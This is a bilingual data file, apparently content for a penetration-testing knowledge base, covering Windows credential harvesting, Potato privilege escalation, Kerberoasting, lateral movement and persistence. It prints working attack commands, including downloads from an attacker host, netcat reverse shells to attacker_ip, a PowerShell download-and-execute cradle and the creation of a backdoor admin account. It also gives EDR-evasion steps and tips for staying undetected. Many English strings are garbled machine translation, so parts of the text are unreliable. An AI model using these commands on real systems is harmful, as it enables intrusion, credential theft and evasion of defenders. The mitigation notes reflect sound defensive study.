description.zh: Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII
description.en: Passwords in Unattend.xml stored as Base64 need decoding. Windows uses UTF-16LE encoding, so Unicode decoding (not ASCII) is required

explanation.zh: 使用系统自带工具解码Base64
explanation.en: Decode Base64 Using Built-in System Tools

title.zh: 检查其他敏感安装文件

execution.command:
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear

description.zh: 除Unattend.xml外，其他位置也可能存储明文凭证
description.en: Besides Unattend.xml, other locations may also store plaintext credentials

explanation.zh: GPP使用的AES加密密码字段(密钥已公开)
域控共享目录，所有域用户可读
explanation.en: Domain controller shared directory, readable by all domain users

explanation.zh: 查询注册表中的密码值

execution.command:
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump

description.zh: 使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证
description.en: Use Metasploit post-exploitation module to automatically search and extract credentials from unattended installation files

edrBypass.command:
# 使用Volume Shadow Copy读取被锁定的文件
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# 使用PowerShell流式读取避免文件锁
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")

description.zh: 通过卷影副本或流式读取绕过文件访问监控
description.en: Bypass file access monitoring via volume shadow copy or streamed reads

analysis.zh: 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。
analysis.en: Unattended installation files are artifacts of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may contain local or domain admin plaintext/encoded credentials. This vulnerability is extremely common in enterprise environments because IT departments often neglect to clean up these files after deployment.

opsecTips.zh: 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。
opsecTips.en: File read operations usually do not trigger alerts, but extensive file searches (dir /s) may be detected by EDR. Recommend checking known paths directly rather than searching all drives.

overview.zh: 无人值守安装文件(Unattend.xml)用于Windows自动化部署，可能包含管理员凭证。
overview.en: Unattended installation files (Unattend.xml) are used for automated Windows deployment and may contain admin credentials.

vulnerability.zh: Windows部署工具(如MDT、SCCM)生成的Unattend.xml文件中，密码以明文或弱编码(Base64)存储，且部署完成后文件常残留在系统中。
vulnerability.en: In Unattend.xml files generated by Windows deployment tools (e.g., MDT, SCCM), passwords are stored as plaintext or weakly encoded (Base64), and files often remain on the system after deployment.

exploitation.zh: 利用流程：1) 搜索默认路径下的Unattend/Sysprep文件 2) 提取Password/AutoLogon字段 3) 解码Base64密码 4) 使用获取的凭证横向移动
exploitation.en: Exploitationworkflow: 1) SearchDefaultPathBelow Unattend/SysprepFile 2) ExtractPassword/AutoLogonfield 3) DecodingBase64Password 4) UseObtain CredentialsLateral Movement

mitigation.zh: 防御措施：1) 部署完成后立即删除Unattend文件 2) 不在Unattend中存储域管理员密码 3) 使用LAPS管理本地管理员密码 4) 定期审计敏感文件
mitigation.en: Defenses: 1) Delete Unattend files immediately after deployment 2) Do not store Domain Admin passwords in Unattend files 3) Use LAPS for local admin passwords 4) Regularly audit sensitive files

description.zh: 利用Windows令牌模拟和NTLM中继机制从服务账户(SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege)提权到SYSTEM
description.en: Exploit Windows token impersonation and NTLM relay from service accounts (SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege) to escalate to SYSTEM

prerequisites.zh: 常见于IIS AppPool、SQL Server、各类服务账户

execution.command:
# 检查是否拥有Impersonate权限
whoami /priv

# 重点关注以下权限:
# SeImpersonatePrivilege - 模拟客户端令牌
# SeAssignPrimaryTokenPrivilege - 替换进程级令牌

# 确认当前用户身份
whoami /all
echo %USERNAME%

description.zh: 首先确认当前用户是否拥有令牌模拟权限。IIS应用池账户、SQL Server服务账户、Windows服务账户通常默认拥有该权限
description.en: First confirm whether the current user has token impersonation privileges. IIS app pool accounts, SQL Server service accounts, and Windows service accounts typically have this privilege by default

explanation.zh: 列出当前用户所有特权
允许模拟其他用户令牌的关键特权
explanation.en: Key privilege allowing impersonation of other user tokens

explanation.zh: 允许为新进程分配令牌
explanation.en: Allows assigning tokens to new processes

execution.title: JuicyPotato (Windows Server 2016/2019)
execution.command:
# 下载JuicyPotato
certutil -urlcache -split -f http://attacker/JuicyPotato.exe C:\temp\jp.exe

# 使用JuicyPotato提权执行命令
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c whoami > C:\temp\proof.txt" -t *

# 使用特定CLSID (不同系统需要不同CLSID)
C:\temp\jp.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

# 反弹Shell
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe attacker_ip 4444" -t *

description.zh: JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令
description.en: JuicyPotato exploits COM servers and NTLM authentication for token impersonation. It creates a local COM server, tricks the SYSTEM account into authenticating to it, then impersonates that token to execute commands

explanation.zh: 指定COM对象CLSID(需匹配目标系统版本)
explanation.en: Specify COM object CLSID (must match target system version)

execution.title: PrintSpoofer (Windows 10/Server 2019+)
execution.command:
# PrintSpoofer - 利用打印服务命名管道
PrintSpoofer.exe -i -c cmd

# 直接执行命令
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\proof.txt"

# 反弹Shell
PrintSpoofer.exe -c "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe"

# 以SYSTEM身份启动PowerShell
PrintSpoofer.exe -i -c powershell.exe

description.zh: PrintSpoofer利用Windows打印服务的命名管道模拟功能。它创建一个命名管道并欺骗Print Spooler服务连接，从而获取SYSTEM令牌。适用于JuicyPotato无法使用的新版Windows
description.en: PrintSpoofer exploits the Windows Print Spooler named pipe impersonation feature. It creates a named pipe and tricks the Print Spooler service into connecting, obtaining a SYSTEM token. Suitable for newer Windows versions where JuicyPotato does not work

execution.command:
# SweetPotato - 集成多种Potato技术
SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"

# 指定攻击方式
SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"

description.zh: SweetPotato集成了PrintSpoofer、EfsPotato等多种技术，自动选择适合目标系统的攻击方式
description.en: SweetPotato integrates PrintSpoofer, EfsPotato, and other techniques, automatically selecting the best attack method for the target system

explanation.zh: 指定使用EFS RPC攻击向量

execution.command:
# GodPotato - 适用于Windows Server 2012-2022所有版本
GodPotato.exe -cmd "cmd /c whoami"

# 执行反弹Shell
GodPotato.exe -cmd "cmd /c C:\temp\nc.exe -e cmd.exe attacker_ip 4444"

# 添加管理员
GodPotato.exe -cmd "net user testadmin Test@123 /add && net localgroup administrators testadmin /add"

# 执行PowerShell
GodPotato.exe -cmd "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

description.zh: GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种
description.en: GodPotato exploits a DCOM OXID resolver vulnerability, requires no CLSID specification, and is compatible with nearly all Windows versions. It is currently the most universal Potato variant

explanation.zh: 全版本兼容的Potato提权工具

execution.command:
# 攻击机 - 启动socat重定向
socat tcp-listen:135,reuseaddr,fork tcp:target_ip:9999

# 目标机 - 执行RoguePotato
RoguePotato.exe -r attacker_ip -e "cmd /c whoami > C:\temp\proof.txt" -l 9999

# 或使用netcat反弹
RoguePotato.exe -r attacker_ip -e "C:\temp\nc.exe attacker_ip 4444 -e cmd.exe" -l 9999

description.zh: RoguePotato是JuicyPotato的改进版，通过远程OXID解析器实现NTLM认证中继。需要一台攻击机辅助完成中继
description.en: RoguePotato is an improved version of JuicyPotato that uses a remote OXID resolver for NTLM authentication relay. Requires an attack machine to assist with the relay

execution.command:
# === 决策流程 ===
# 1. whoami /priv 确认SeImpersonatePrivilege
# 2. systeminfo 确认系统版本
#
# Windows Server 2012-2016 => JuicyPotato
# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
# Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
# Windows Server 2022 => GodPotato
# 所有版本 => SweetPotato (自动选择)
# 需要远程中继 => RoguePotato
#
# 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/

description.zh: 根据目标系统版本选择合适的Potato变种工具
description.en: Choose the Appropriate Potato Variant Based on Target System Version

title.en: Potato Techniques for Bypassing EDR Detection

edrBypass.command:
# 1. 重命名二进制文件
ren GodPotato.exe svcutil.exe

# 2. 使用.NET反射加载(无文件落地)
powershell -ep bypass -c "$bytes=[System.IO.File]::ReadAllBytes('C:\temp\gp.exe');[System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,@('-cmd','cmd /c whoami')))";

# 3. 使用SharpToken替代(较新工具,签名较少)
SharpToken.exe execute SYSTEM "cmd /c whoami"

description.zh: 通过反射加载、重命名、使用较新工具等方式绕过EDR对Potato工具的检测
description.en: Bypass EDR detection of Potato tools through reflective loading, renaming, using newer tools, and other methods

analysis.zh: Potato系列攻击利用Windows的令牌模拟机制——拥有SeImpersonatePrivilege的服务账户可以模拟向其认证的任何用户令牌。攻击者通过欺骗SYSTEM账户向本地COM服务器/命名管道认证，获取SYSTEM令牌后创建高权限进程。这是Web服务器(IIS)和数据库(SQL Server)提权最常见的方式之一。
analysis.en: The Potato family of attacks exploits the Windows token impersonation mechanism — service accounts with SeImpersonatePrivilege can impersonate the token of any user authenticating to them. Attackers trick the SYSTEM account into authenticating to a local COM server or named pipe, then use the SYSTEM token to create high-privilege processes. This is one of the most common privilege escalation methods for web servers (IIS) and databases (SQL Server).

opsecTips.zh: 1) Potato工具的二进制文件特征明显，建议内存加载 2) 创建的命名管道名称可能被监控 3) 成功后立即清理工具和临时文件 4) 避免使用net user等敏感命令，改用更隐蔽的后渗透方式
opsecTips.en: 1) Potato tool binaries have obvious signatures — recommend in-memory loading 2) Created named pipe names may be monitored 3) Clean up tools and temp files immediately after success 4) Avoid sensitive commands like net user; use stealthier post-exploitation methods

overview.zh: Potato系列是Windows环境下从服务账户提权到SYSTEM的经典攻击技术，利用令牌模拟和NTLM中继实现。
overview.en: The Potato family is a classic Windows privilege escalation technique from service accounts to SYSTEM, leveraging token impersonation and NTLM relay.

vulnerability.zh: Windows服务账户(IIS/SQL Server等)默认拥有SeImpersonatePrivilege权限。攻击者可利用此权限通过DCOM/命名管道欺骗SYSTEM账户认证，模拟其令牌实现提权。
vulnerability.en: Windows service accounts (IIS/SQL Server, etc.) have SeImpersonatePrivilege by default. Attackers can exploit this privilege through DCOM/named pipe to trick the SYSTEM account into authenticating, then impersonate its token for privilege escalation.

exploitation.zh: 利用流程：1) whoami /priv确认Impersonate权限 2) 根据系统版本选择合适的Potato工具 3) 执行Potato获取SYSTEM权限 4) 进行后渗透操作
exploitation.en: Exploitation workflow: 1) Confirm impersonation privileges with whoami /priv 2) Choose appropriate Potato tool based on system version 3) Execute Potato to obtain SYSTEM privileges 4) Perform post-exploitation

mitigation.zh: 防御措施：1) 最小权限原则，移除不必要的SeImpersonatePrivilege 2) 使用gMSA账户运行服务 3) 监控异常令牌操作和命名管道创建 4) 及时更新Windows补丁
mitigation.en: Defenses: 1) Principle of least privilege — remove unnecessary SeImpersonatePrivilege 2) Use gMSA accounts to run services 3) Monitor anomalous token operations and named pipe creation 4) Keep Windows patches up to date

analysis.zh: BloodHound可发现域内的攻击路径，如权限提升路径、会话信息、组关系等。
analysis.en: BloodHound can discover attack paths within the domain, such as privilege escalation paths, session information, and group relationships.

opsecTips.en: BloodHound collection generates a large volume of LDAP queries

opsecTips.zh: 可能触发域控制器告警
建议在非工作时间执行
opsecTips.en: Recommended to run during non-business hours

overview.zh: BloodHound是一款用于分析Active Directory信任关系的工具，可以可视化攻击路径，帮助发现权限提升机会。
overview.en: BloodHound is a tool for analyzing Active Directory trust relationships, capable of visualizing attack paths and discovering privilege escalation opportunities.

vulnerability.zh: Active Directory的复杂信任关系可能导致意外的权限提升路径，BloodHound可以发现这些路径。
vulnerability.en: Complex trust relationships in Active Directory may lead to unexpected privilege escalation paths, which BloodHound can uncover.

exploitation.zh: 利用流程：1) 采集域信息；2) 导入BloodHound；3) 分析攻击路径；4) 发现权限提升机会；5) 执行攻击。
exploitation.en: Exploitation workflow: 1) Collect domain information; 2) Import into BloodHound; 3) Analyze attack paths; 4) Identify privilege escalation opportunities; 5) Execute the attack.

mitigation.zh: 防御措施：1) 定期审计AD权限；2) 最小权限原则；3) 监控异常LDAP查询；4) 清理不必要的信任关系。
mitigation.en: Defenses: 1) Regularly audit AD permissions; 2) Apply the principle of least privilege; 3) Monitor anomalous LDAP queries; 4) Remove unnecessary trust relationships.

opsecTips.en: Can be used for subsequent Kerberoasting attacks

overview.zh: SPN扫描可以发现域内运行的服务账户，为Kerberoasting攻击做准备。
overview.en: SPN scanning reveals service accounts running in the domain, laying the groundwork for Kerberoasting attacks.

vulnerability.zh: SPN是Kerberos认证的一部分，攻击者可以通过SPN找到高价值的服务账户。
vulnerability.en: SPNs are part of Kerberos authentication; attackers can use them to locate high-value service accounts.

exploitation.zh: 利用流程：1) 扫描SPN；2) 识别高价值账户；3) 请求Kerberos票据；4) 离线破解。
exploitation.en: Exploitation workflow: 1) Scan for SPNs; 2) Identify high-value accounts; 3) Request Kerberos tickets; 4) Crack offline.

mitigation.zh: 防御措施：1) 服务账户使用强密码；2) 监控异常的SPN查询；3) 定期审计SPN账户。
mitigation.en: Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous SPN queries; 3) Regularly audit SPN-associated accounts.

优先考虑使用其他更隐蔽的工具

overview.zh: Mimikatz是一款强大的Windows安全测试工具，可以从内存中提取明文密码、哈希、Kerberos票据等凭证信息。
overview.en: Mimikatz is a powerful Windows security testing tool that can extract plaintext passwords, hashes, Kerberos tickets, and other credentials from memory.

vulnerability.zh: Windows系统将用户凭证存储在LSASS进程内存中，Mimikatz可以直接读取这些凭证。这是Windows认证机制的设计特性。
vulnerability.en: Windows stores user credentials in the LSASS process memory, and Mimikatz can read them directly. This is by design in the Windows authentication mechanism.

exploitation.zh: 利用流程：1) 获取管理员权限；2) 绕过杀毒软件；3) 执行Mimikatz抓取凭证；4) 使用凭证进行横向移动；5) 提升到域管理员权限。
exploitation.en: Exploitation workflow: 1) Obtain administrator privileges; 2) Bypass antivirus; 3) Run Mimikatz to dump credentials; 4) Use credentials for lateral movement; 5) Escalate to Domain Admin.

mitigation.zh: 防御措施：1) 启用Credential Guard；2) 限制管理员权限；3) 监控LSASS访问；4) 部署EDR解决方案；5) 定期更改密码。
mitigation.en: Defenses: 1) Enable Credential Guard; 2) Restrict administrator privileges; 3) Monitor LSASS access; 4) Deploy an EDR solution; 5) Rotate passwords regularly.

analysis.en: Kerberoasting obtains Kerberos tickets for service accounts, which can be cracked offline to reveal plaintext passwords.

opsecTips.en: Recommended to use RC4 encryption to avoid detection

overview.zh: Kerberoasting是一种针对Kerberos协议的攻击，攻击者可以请求服务票据并离线破解服务账户密码。
overview.en: Kerberoasting is an attack targeting the Kerberos protocol where the attacker requests service tickets and cracks service account passwords offline.

vulnerability.zh: Kerberos服务票据使用服务账户密码加密，攻击者可以请求票据后离线破解。服务账户通常密码复杂度较低。
vulnerability.en: Kerberos service tickets are encrypted with the service account password. Attackers can request tickets and crack them offline. Service accounts often have weak password complexity.

exploitation.zh: 利用流程：1) 获取任意域用户凭证；2) 查询域内SPN；3) 请求服务票据；4) 导出票据；5) 离线破解密码。
exploitation.en: Exploitation workflow: 1) Obtain any domain user credentials; 2) Query SPNs in the domain; 3) Request service tickets; 4) Export tickets; 5) Crack passwords offline.

mitigation.zh: 防御措施：1) 服务账户使用强密码；2) 监控异常的票据请求；3) 定期轮换服务账户密码；4) 部署蜜罐账户检测攻击。
mitigation.en: Defenses: 1) Use strong passwords for service accounts; 2) Monitor anomalous ticket requests; 3) Rotate service account passwords regularly; 4) Deploy honeypot accounts to detect attacks.

analysis.zh: AS-REP Roasting可以获取禁用Pre-auth用户的哈希，离线破解后得到明文密码。
analysis.en: AS-REP Roasting obtains hashes for users with Pre-authentication disabled, which can be cracked offline to reveal plaintext passwords.

overview.zh: AS-REP Roasting是一种针对禁用Kerberos Pre-authentication用户的攻击。
overview.en: AS-REP Roasting is OneTargeting for DisableKerberos Pre-authenticationUsers Attack.

vulnerability.zh: 禁用Pre-auth的用户可以直接获取AS-REP，其中包含可离线破解的哈希。
vulnerability.en: Users with Pre-authentication disabled allow direct retrieval of AS-REP responses containing offline-crackable hashes.

exploitation.zh: 利用流程：1) 查找禁用Pre-auth的用户；2) 请求AS-REP；3) 提取哈希；4) 离线破解。
exploitation.en: Exploitation workflow: 1) Find users with Pre-auth disabled; 2) Request AS-REP; 3) Extract hashes; 4) Crack offline.

mitigation.zh: 防御措施：1) 启用所有用户的Pre-auth；2) 监控异常的AS-REQ；3) 使用强密码。
mitigation.en: Defenses: 1) Enable Pre-authentication for all users; 2) Monitor anomalous AS-REQ requests; 3) Use strong passwords.

opsecTips.zh: 考虑使用混淆或内存加载

overview.zh: LaZagne是一款开源的凭证抓取工具，支持从多种应用程序中提取保存的密码。
overview.en: LaZagne is an open-source credential harvesting tool that extracts saved passwords from a wide range of applications.

vulnerability.zh: 许多应用程序以不安全的方式存储用户凭证，LaZagne可以提取这些凭证。
vulnerability.en: Many applications store user credentials insecurely, and LaZagne can extract them.

exploitation.zh: 利用流程：1) 获取目标机器访问权限；2) 运行LaZagne；3) 提取凭证；4) 使用凭证横向移动。
exploitation.en: Exploitationworkflow: 1) ObtainTargetMachineAccessPermission; 2) RunLaZagne; 3) Extract Credentials; 4) UseCredentialsLateral Movement.

mitigation.zh: 防御措施：1) 不在应用程序中保存密码；2) 使用密码管理器；3) 监控异常进程。
mitigation.en: Defensemeasures: 1) not in ApplicationMiddleSavePassword; 2) UsePasswordManagementTool; 3) MonitoringExceptionProcess.

overview.zh: SAM数据库存储Windows本地账户的密码哈希，可以导出后离线破解或用于Pass-the-Hash。
overview.en: The SAM database stores Windows local account password hashes, which can be exported for offline cracking or Pass-the-Hash attacks.

vulnerability.zh: SAM数据库可以被管理员访问，其中的哈希可以用于离线破解或Pass-the-Hash攻击。

exploitation.zh: 利用流程：1) 获取管理员权限；2) 导出SAM和SYSTEM；3) 提取哈希；4) 破解或PtH。

mitigation.zh: 防御措施：1) 监控域管理员活动；2) 审计DCSync操作；3) 使用强密码。

overview.zh: 组策略首选项(GPP)可以存储本地管理员密码，使用公开密钥加密，可以被解密。

vulnerability.zh: GPP使用公开的AES密钥加密密码，任何人都可以解密。
vulnerability.en: GPP uses a publicly disclosed AES key to encrypt passwords — anyone can decrypt them.

exploitation.zh: 利用流程：1) 访问SYSVOL；2) 查找GPP XML文件；3) 提取cpassword；4) 解密密码。
exploitation.en: Exploitationworkflow: 1) AccessSYSVOL; 2) FindGPP XMLFile; 3) Extractcpassword; 4) DecryptionPassword.

mitigation.zh: 防御措施：1) 安装MS14-025补丁；2) 删除现有的GPP密码；3) 使用LAPS管理本地管理员密码。
mitigation.en: Defenses: 1) Install the MS14-025 patch; 2) Delete existing GPP passwords; 3) Use LAPS to manage local administrator passwords.

opsecTips.zh: PsExec会在目标机器创建服务，容易被检测

opsecTips.zh: 服务名称和二进制文件可能触发告警

opsecTips.zh: 考虑使用更隐蔽的横向移动方式

overview.zh: PsExec是Sysinternals套件中的工具，允许在远程机器上执行进程。攻击者常用于横向移动。
overview.en: PsExec is a tool from the Sysinternals suite that allows remote process execution. It is commonly used by attackers for lateral movement.

vulnerability.zh: PsExec利用SMB协议和Windows服务机制，通过ADMIN$共享上传可执行文件并创建服务执行。
vulnerability.en: PsExecExploitationSMBProtocol and WindowsServiceMechanism, throughADMIN$SharesUploadCanExecuteFile and CreateServiceExecute.

exploitation.zh: 利用流程：1) 获取目标机器凭证；2) 通过SMB连接目标；3) 上传可执行文件到ADMIN$；4) 创建并启动服务；5) 获取远程Shell。
exploitation.en: Exploitationworkflow: 1) ObtainTargetMachineCredentials; 2) throughSMBConnectionTarget; 3) UploadCanExecuteFile to ADMIN$; 4) Create and Start Service; 5) ObtainRemoteShell.

mitigation.zh: 防御措施：1) 禁用ADMIN$共享；2) 限制SMB访问；3) 监控服务创建；4) 部署EDR检测异常行为。
mitigation.en: Defensemeasures: 1) DisableADMIN$Shares; 2) RestrictSMBAccess; 3) MonitoringServiceCreate; 4) DeploymentEDRDetectionExceptionbehavior.

overview.zh: WMI(Windows Management Instrumentation)是Windows管理框架的核心组件，可用于远程管理和命令执行。
overview.en: WMI(Windows Management Instrumentation) is WindowsManagementFramework CoreComponent, Can used for RemoteManagement and Command Execution.

vulnerability.zh: WMI允许管理员远程管理Windows系统，攻击者可以利用此功能执行命令和横向移动。
vulnerability.en: WMI allows administrators to remotely manage Windows systems; attackers can abuse this capability to execute commands and move laterally.

exploitation.zh: 利用流程：1) 获取目标凭证；2) 通过WMI连接目标；3) 调用Win32_Process创建进程；4) 执行命令获取结果。
exploitation.en: Exploitationworkflow: 1) ObtainTargetCredentials; 2) throughWMIConnectionTarget; 3) CallWin32_ProcessCreateProcess; 4) Execute CommandObtainResult.

mitigation.zh: 防御措施：1) 限制WMI远程访问；2) 监控WMI活动；3) 部署EDR检测异常WMI调用；4) 使用防火墙限制135端口。
mitigation.en: Defenses: 1) Restrict remote WMI access; 2) Monitor WMI activity; 3) Deploy EDR to detect anomalous WMI calls; 4) Use firewall rules to restrict port 135.

overview.zh: Pass-the-Hash是一种利用NTLM哈希进行身份验证的攻击技术，攻击者无需知道明文密码即可通过认证。
overview.en: Pass-the-Hash is an attack technique that uses NTLM hashes for authentication — the attacker does not need the plaintext password.

vulnerability.zh: NTLM认证机制允许使用密码哈希进行认证，一旦哈希泄露，攻击者可以冒充用户身份。
vulnerability.en: The NTLM authentication mechanism allows authentication using password hashes; once a hash is leaked, an attacker can impersonate the user.

exploitation.zh: 利用流程：1) 获取用户NTLM哈希；2) 使用工具进行PtH；3) 获取目标机器访问权限；4) 执行后续攻击。
exploitation.en: Exploitation workflow: 1) Obtain the user's NTLM hash; 2) Perform PtH with an appropriate tool; 3) Gain access to the target machine; 4) Execute follow-up attacks.

mitigation.zh: 防御措施：1) 限制NTLM认证；2) 启用Kerberos；3) 监控异常登录；4) 使用受限管理模式。
mitigation.en: Defenses: 1) Restrict NTLM authentication; 2) Enforce Kerberos; 3) Monitor anomalous logons; 4) Use Restricted Admin mode.

analysis.en: A successful NTLM Relay grants access to the target machine or escalates domain privileges.

域控制器默认启用签名

overview.zh: NTLM Relay是一种中间人攻击，攻击者将捕获的NTLM认证中继到其他服务，实现身份冒用。
overview.en: NTLM Relay is a man-in-the-middle attack where the attacker relays captured NTLM authentication to another service, impersonating the victim.

vulnerability.zh: NTLM协议本身存在设计缺陷，允许中继攻击。如果目标服务器未启用签名验证，攻击者可以冒充受害者身份。
vulnerability.en: The NTLM protocol has inherent design flaws that permit relay attacks. If the target server does not enforce signing, the attacker can impersonate the victim.

exploitation.zh: 利用流程：1) 启动Responder或ntlmrelayx监听；2) 诱导目标机器发起认证；3) 中继认证到目标服务；4) 获取访问权限或执行操作。
exploitation.en: Exploitation workflow: 1) Start Responder or ntlmrelayx listener; 2) Coerce the target to authenticate; 3) Relay the authentication to the target service; 4) Gain access or execute operations.

mitigation.zh: 防御措施：1) 启用SMB签名；2) 禁用NTLM认证；3) 启用Extended Protection for Authentication；4) 监控异常认证行为。
mitigation.en: Defensemeasures: 1) EnableSMBSignature; 2) DisableNTLMAuthentication; 3) EnableExtended Protection for Authentication; 4) MonitoringExceptionAuthenticationbehavior.

overview.zh: Windows访问令牌(Access Token)包含用户身份和权限信息，攻击者可以窃取高权限用户的令牌来提升权限。
overview.en: Windows Access Tokens contain user identity and privilege information; an attacker can steal a high-privilege user's token to escalate privileges.

vulnerability.zh: Windows允许进程模拟其他用户的令牌，如果服务账户具有SeImpersonatePrivilege权限，攻击者可以利用此权限获取SYSTEM权限。
vulnerability.en: Windows allows processes to impersonate other users' tokens. If a service account has SeImpersonatePrivilege, an attacker can leverage it to obtain SYSTEM privileges.

exploitation.zh: 利用流程：1) 获取SeImpersonatePrivilege权限的服务账户；2) 使用Potato系列工具触发SYSTEM进程连接；3) 窃取SYSTEM令牌；4) 以SYSTEM权限执行命令。
exploitation.en: Exploitation workflow: 1) Obtain a service account with SeImpersonatePrivilege; 2) Use a Potato family tool to trigger a SYSTEM process connection; 3) Steal the SYSTEM token; 4) Execute commands as SYSTEM.

mitigation.zh: 防御措施：1) 移除不必要的服务账户SeImpersonatePrivilege权限；2) 监控令牌操作；3) 部署EDR检测异常行为；4) 及时更新系统补丁。
mitigation.en: Defenses: 1) Remove unnecessary SeImpersonatePrivilege from service accounts; 2) Monitor token manipulation; 3) Deploy EDR to detect anomalous behavior; 4) Apply system patches promptly.

opsecTips.zh: 考虑使用更隐蔽的方式
定期检查注册表异常项
opsecTips.en: Regularly check for anomalous registry entries

overview.zh: Windows注册表提供了多种持久化机制，攻击者可以在系统启动或用户登录时自动执行恶意代码。
overview.en: The Windows Registry provides multiple persistence mechanisms; attackers can auto-execute malicious code at system startup or user logon.

vulnerability.zh: Windows注册表中的多个键值可以在特定时机自动执行程序，这是系统设计功能，但可被攻击者滥用。
vulnerability.en: Multiple registry keys can automatically execute programs at specific events — this is a system design feature but can be abused by attackers.

exploitation.zh: 利用流程：1) 获取管理员权限；2) 选择持久化位置；3) 添加恶意程序路径；4) 等待系统重启或用户登录；5) 恶意程序自动执行。
exploitation.en: Exploitation workflow: 1) Obtain administrator privileges; 2) Choose a persistence location; 3) Add a malicious program path; 4) Wait for system restart or user logon; 5) The malicious program executes automatically.

mitigation.zh: 防御措施：1) 监控注册表关键键值变化；2) 使用白名单限制程序执行；3) 定期审计持久化项；4) 部署EDR检测异常行为。
mitigation.en: Defenses: 1) Monitor changes to critical registry keys; 2) Use application whitelisting to restrict execution; 3) Regularly audit persistence entries; 4) Deploy EDR to detect anomalous behavior.

vulnerability.zh: 内网机器可以访问公网时，攻击者可以建立隧道将内网服务映射出去。
vulnerability.en: When internal machines can reach the internet, an attacker can establish a tunnel to map internal services outward.

exploitation.zh: 利用流程：1) 在公网服务器部署FRP服务端；2) 在内网机器运行FRP客户端；3) 建立隧道连接；4) 通过隧道访问内网服务。
exploitation.en: Exploitationworkflow: 1) in Public networkServerDeploymentFRPServer-Side; 2) in Internal networkMachineRunFRPClient; 3) EstablishtunnelConnection; 4) throughtunnelAccessInternal networkService.

mitigation.zh: 防御措施：1) 监控异常外联流量；2) 限制出站连接；3) 部署流量分析设备；4) 禁止未授权的代理工具。
mitigation.en: Defenses: 1) Monitor anomalous outbound traffic; 2) Restrict outbound connections; 3) Deploy traffic analysis appliances; 4) Block unauthorized proxy tools.

vulnerability.zh: HTTP隧道可以绕过防火墙限制，将内网服务暴露出去。

exploitation.zh: 利用流程：1) 在公网服务器运行Chisel服务端；2) 在内网机器运行Chisel客户端；3) 建立隧道；4) 通过代理访问内网。

mitigation.zh: 防御措施：1) 监控异常HTTP流量；2) 检测长连接；3) 部署流量分析。
mitigation.en: Defenses: 1) Monitor anomalous HTTP traffic; 2) Detect long-lived connections; 3) Deploy traffic analysis.

overview.zh: PowerShell是Windows强大的脚本环境，攻击者可以使用各种技术绕过检测。
overview.en: PowerShell is a powerful scripting environment in Windows; attackers use various techniques to bypass detection.

vulnerability.zh: PowerShell的灵活性和强大功能使其成为攻击者的首选工具。
vulnerability.en: PowerShell's flexibility and power make it a preferred tool for attackers.

exploitation.zh: 利用流程：1) 获取目标机器访问权限；2) 使用免杀技术；3) 执行恶意脚本；4) 完成攻击。

mitigation.zh: 防御措施：1) 启用PowerShell日志；2) 使用约束语言模式；3) 监控异常PowerShell活动。

vulnerability.zh: AD中的ACL配置错误可能允许低权限用户修改高权限对象的属性或权限。
vulnerability.en: ACL misconfigurations in AD may allow low-privilege users to modify properties or permissions of high-privilege objects.

mitigation.en: Defenses: 1) Regularly audit ACL configurations; 2) Apply the principle of least privilege; 3) Monitor ACL modifications; 4) Deploy anomaly detection.

explanation.zh: 递归搜索并仅输出文件完整路径

explanation.en: Default directory for Windows installation logs and configuration

title.en: Full Disk Search for Unattend Files

execution.command:
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName

description.zh: 当默认路径找不到时，全盘递归搜索所有可能的无人值守文件
description.en: When default paths yield nothing, recursively search all drives for possible unattended files

explanation.zh: 按通配符模式匹配文件名

execution.command:
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
